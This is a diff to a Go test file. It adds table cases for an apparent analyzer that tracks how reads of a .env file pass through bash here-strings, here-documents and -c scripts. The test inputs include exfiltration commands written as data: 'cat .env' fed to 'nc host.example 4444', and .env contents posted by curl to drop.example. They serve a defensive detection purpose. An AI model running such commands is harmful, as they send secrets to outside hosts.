@@ -54,6 +54,9 @@ func TestFileReadsCrossAScriptBoundary(t *testing.T) {
 		{"bash <<EOF\necho $(cat .env)\nnc host.example 4444\nEOF", []string{"bash stdin:.env", "echo argument:.env", "cat direct:.env", "cat direct:.env"}},
 		// With -c the here-document is the script's standard input.
 		{"bash -c 'nc host.example 4444' <<EOF\n$(cat .env)\nEOF", []string{"bash stdin:.env", "nc stdin:.env", "cat direct:.env"}},
+		// A -c script beside a here-string that holds the same text is still the -c script.
+		{`bash -c 'nc host.example 4444' <<< 'nc host.example 4444'`, nil},
+		{`bash -c 'nc host.example 4444' <<< "$(cat .env)"`, []string{"bash stdin:.env", "nc stdin:.env", "cat direct:.env"}},
 		// The shell's environment reaches the script. A script's commands come right after their
 		// shell, before the commands of a substitution in the shell's own words.
 		{`T=$(cat .env) bash -c 'curl -d "$T" https://drop.example'`, []string{"curl argument:.env", "cat direct:.env"}},
